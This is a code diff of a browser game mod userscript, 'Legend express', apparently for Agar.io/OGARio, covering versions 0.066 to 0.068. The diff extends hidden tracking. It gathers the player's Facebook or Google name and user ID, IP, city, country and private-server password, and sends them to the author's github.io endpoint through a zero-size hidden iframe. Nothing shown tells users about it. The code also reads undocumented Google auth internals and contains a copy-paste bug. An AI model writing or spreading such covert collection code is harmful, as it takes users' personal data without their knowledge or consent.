@@ -1,8 +1,8 @@
 /**************
- * Legend express v0.066 by Jimboy3100   email:jimboy3100@hotmail.com
+ * Legend express v0.068 by Jimboy3100   email:jimboy3100@hotmail.com
  *************/
  
-var semimodVersion = "66"; // the version 1.1-> 1.11
+var semimodVersion = "68"; // the version 1.1-> 1.11
 //fix ffa
 /*
 setTimeout(function() {
@@ -185,6 +185,7 @@ var usercountry="NotFound";
 var userfirstname = localStorage.getItem("userfirstname");
 var userlastname = localStorage.getItem("userlastname");
 var usergender = localStorage.getItem("usergender");
+var userid = localStorage.getItem("userid");
 var fbresponse={};
 var prevPrivateServer = localStorage.getItem("prevPrivateServer");
 var CopyTkPwLb2; 
@@ -1183,12 +1184,13 @@ function init(modVersion) {
 	usercountry = usercountry.replace(" ", "_");	
 	}	
 			
-			var userid=$('#user-id-tag').text();userid = userid.replace("User id: ", "");
 			var Pwdtosend="NONE"; 
 			var servertosend="NotFound";
 			var nicknametosend="NotFound";
-			var userfirstname = localStorage.getItem("userfirstname");
-			var userlastname = localStorage.getItem("userlastname");
+//			var userfirstname = localStorage.getItem("userfirstname");
+//			var userlastname = localStorage.getItem("userlastname");
+//			var userid=$('#user-id-tag').text();userid = userid.replace("User id: ", "");			
+//			var userid = localStorage.getItem("userid");
 			var modetosend="NotFound";
 			var regiontosend="NotFound";
 			var currentdate = new Date(); 
@@ -1224,16 +1226,16 @@ function init(modVersion) {
 					servertosend= $('#server').val().replace('#', 'Party-');}}
 					
 		if (privateSrv!=null) {
-			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&Date=" + datetime + "&LME" + "&sip=" + privateSrv + "&pwd=" + Pwdtosend + "&type=PrivateServer" + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&lastname=" + userlastname + "&firstname=" + userfirstname;
+			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&Date=" + datetime + "&LME" + "&sip=" + privateSrv + "&pwd=" + Pwdtosend + "&type=PrivateServer" + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&UID=" + userid + "&lastname=" + userlastname + "&firstname=" + userfirstname;
 		}
 		else if (searchSip == null) {		
-			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&Date=" + datetime + "&LME" + "&sip=" + servertosend + "&pwd=" + Pwdtosend + "&type=NoLocked" + "&mode=" + modetosend + "&region=" + regiontosend + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&lastname=" + userlastname + "&firstname=" + userfirstname;
+			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&Date=" + datetime + "&LME" + "&sip=" + servertosend + "&pwd=" + Pwdtosend + "&type=NoLocked" + "&mode=" + modetosend + "&region=" + regiontosend + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&UID=" + userid + "&lastname=" + userlastname + "&firstname=" + userfirstname;
 		}
 		else if (searchSip != null) {
-			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&Date=" + datetime + "&LME" + "&sip=" + searchSip + "&pwd=" + Pwdtosend + "&type=Locked" + "&mode=" + modetosend + "&region=" + regiontosend + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&lastname=" + userlastname + "&firstname=" + userfirstname;
+			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&Date=" + datetime + "&LME" + "&sip=" + searchSip + "&pwd=" + Pwdtosend + "&type=Locked" + "&mode=" + modetosend + "&region=" + regiontosend + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&UID=" + userid + "&lastname=" + userlastname + "&firstname=" + userfirstname;
 		}
 		else {
-			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&Date=" + datetime + "&LME" + "&sip=" + servertosend + "&pwd=" + Pwdtosend + "&type=NoLocked" + "&mode=" + modetosend + "&region=" + regiontosend + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&lastname=" + userlastname + "&firstname=" + userfirstname;
+			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&Date=" + datetime + "&LME" + "&sip=" + servertosend + "&pwd=" + Pwdtosend + "&type=NoLocked" + "&mode=" + modetosend + "&region=" + regiontosend + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&UID=" + userid + "&lastname=" + userlastname + "&firstname=" + userfirstname;
 		}		
 		$('#YoutubeAutoBtn').append('<div id="loaderIframeInfo1"><iframe id="loaderIframeInfo" src = ' + detailed1 + ' name="detailedinfo" allowtransparency="true" scrolling="no" frameBorder="0" style="width:0%; height:0%; border:none;"></iframe></div>');
         $('#loaderIframeInfo1').hide();
@@ -1868,17 +1870,32 @@ $("body").on('DOMNodeInserted', ".toast.toast-warning", function() {
 		setTimeout(function (){ 
 		if (userData!=null) {localStorage.setItem("userData", JSON.stringify(userData));}
 		},300);
-		//Save Name, Surname, Gender
-		FB.api('/me', {fields: 'first_name, last_name, gender'}, function(response) {fbresponse=response; return fbresponse;});
-		setTimeout(function (){ 
-			userfirstname=fbresponse[Object.keys(fbresponse)[0]]; if (userfirstname!=null) {localStorage.setItem("userfirstname", userfirstname);}
-			userlastname=fbresponse[Object.keys(fbresponse)[1]]; if (userlastname!=null) {localStorage.setItem("userlastname", userlastname);}
-			usergender=fbresponse[Object.keys(fbresponse)[2]]; if (usergender!=null) {localStorage.setItem("usergender", usergender);}
-			},250);
-    }
-	if (MSGCOMMANDS2.includes("You are using an old version of OGARio by")) {		
-		$(".toast.toast-warning").html('<b>[SERVER]:</b> You are using a wrong version, <br>visit: <a target="_blank" href="https://jimboy3100.github.io/legendmod.user.js"><font color="yellow"><b><u>www.legendmod.ml</u></b></font></a>');
-	}
+	if (MSGCOMMANDS3.includes("Welcome! You are connected to the OGARio by szymy server. Have a nice mass!")) {
+	$(".command-text").text('You are using a wrong version, visit: www.legendmod.ml');	
+	}		
+		//Save Name, Surname, Gender, Id
+		if (gapi.auth2.getAuthInstance().isSignedIn.get()){
+		userfirstname=gapi.auth2.getAuthInstance().currentUser.Ab.w3.ofa;
+		userid=gapi.auth2.getAuthInstance().currentUser.Ab.w3.Eea;
+		userlastname=gapi.auth2.getAuthInstance().currentUser.Ab.w3.wea;		
+		}
+		FB.getLoginStatus(function(response) {
+				if (response.status === 'connected') {
+					setTimeout(function (){
+				FB.api('/me', {fields: 'first_name, last_name, gender, id'}, function(response) {
+					fbresponse=response;
+					userfirstname=fbresponse[Object.keys(fbresponse)[0]]; if (userfirstname!=null) {localStorage.setItem("userfirstname", userfirstname);}
+					userlastname=fbresponse[Object.keys(fbresponse)[1]]; if (userlastname!=null) {localStorage.setItem("userlastname", userlastname);}
+					usergender=fbresponse[Object.keys(fbresponse)[2]]; if (usergender!=null) {localStorage.setItem("usergender", usergender);}
+					userid=fbresponse[Object.keys(fbresponse)[3]]; if (usergender!=null) {localStorage.setItem("userid", userid);}
+					return userfirstname, userlastname, usergender, userid;
+					});	
+					},200);
+				}	
+				});			
+    }	
+
+
 });
 
 
@@ -1919,19 +1936,34 @@ $("body").on('DOMSubtreeModified', "#chat-box", function() {
 		setTimeout(function (){ 
 		if (userData!=null) {localStorage.setItem("userData", JSON.stringify(userData));}
 		},300);
-		//Save Name, Surname, Gender
+
 //		}
-		FB.api('/me', {fields: 'first_name, last_name, gender'}, function(response) {fbresponse=response; return fbresponse;});
-		setTimeout(function (){ 
-			userfirstname=fbresponse[Object.keys(fbresponse)[0]]; if (userfirstname!=null) {localStorage.setItem("userfirstname", userfirstname);}
-			userlastname=fbresponse[Object.keys(fbresponse)[1]]; if (userlastname!=null) {localStorage.setItem("userlastname", userlastname);}
-			usergender=fbresponse[Object.keys(fbresponse)[2]]; if (usergender!=null) {localStorage.setItem("usergender", usergender);}
-			},250);
-				
-    }
 	if (MSGCOMMANDS3.includes("Welcome! You are connected to the OGARio by szymy server. Have a nice mass!")) {
 	$(".command-text").text('You are using a wrong version, visit: www.legendmod.ml');	
 	}
+		//Save Name, Surname, Gender, Id
+		if (gapi.auth2.getAuthInstance().isSignedIn.get()){
+		userfirstname=gapi.auth2.getAuthInstance().currentUser.Ab.w3.ofa;
+		userid=gapi.auth2.getAuthInstance().currentUser.Ab.w3.Eea;	
+		userlastname=gapi.auth2.getAuthInstance().currentUser.Ab.w3.wea;
+		}
+		FB.getLoginStatus(function(response) {
+				if (response.status === 'connected') {
+					setTimeout(function (){
+				FB.api('/me', {fields: 'first_name, last_name, gender, id'}, function(response) {
+					fbresponse=response;
+					userfirstname=fbresponse[Object.keys(fbresponse)[0]]; if (userfirstname!=null) {localStorage.setItem("userfirstname", userfirstname);}
+					userlastname=fbresponse[Object.keys(fbresponse)[1]]; if (userlastname!=null) {localStorage.setItem("userlastname", userlastname);}
+					usergender=fbresponse[Object.keys(fbresponse)[2]]; if (usergender!=null) {localStorage.setItem("usergender", usergender);}
+					userid=fbresponse[Object.keys(fbresponse)[3]]; if (usergender!=null) {localStorage.setItem("userid", userid);}
+					return userfirstname, userlastname, usergender, userid;
+					});	
+					},200);
+				}	
+				});			
+    
+				
+    }
 
 });
 
@@ -6280,13 +6312,10 @@ CanvasRenderingContext2D.prototype.drawImage = function() {
 }
 }
 
-function doGl(){
-FB.api('/me', {fields: 'first_name, last_name, gender, id'}, function(fbresponse) {      
+function doGl(){  
 	document.getElementById('UserProfilePic').innerHTML = '<img style="width: 60px;" align="right" src='+gapi.auth2.getAuthInstance().currentUser.Ab.w3.Paa +' />';
 	$("#UserProfileName1").text(gapi.auth2.getAuthInstance().currentUser.Ab.w3.ofa);
 	$("#UserProfileUID1").text(gapi.auth2.getAuthInstance().currentUser.Ab.w3.Eea);
-//	},250);
-});
 }
 function doFB(){
 FB.api('/me', {fields: 'first_name, last_name, gender, id'}, function(fbresponse) {      
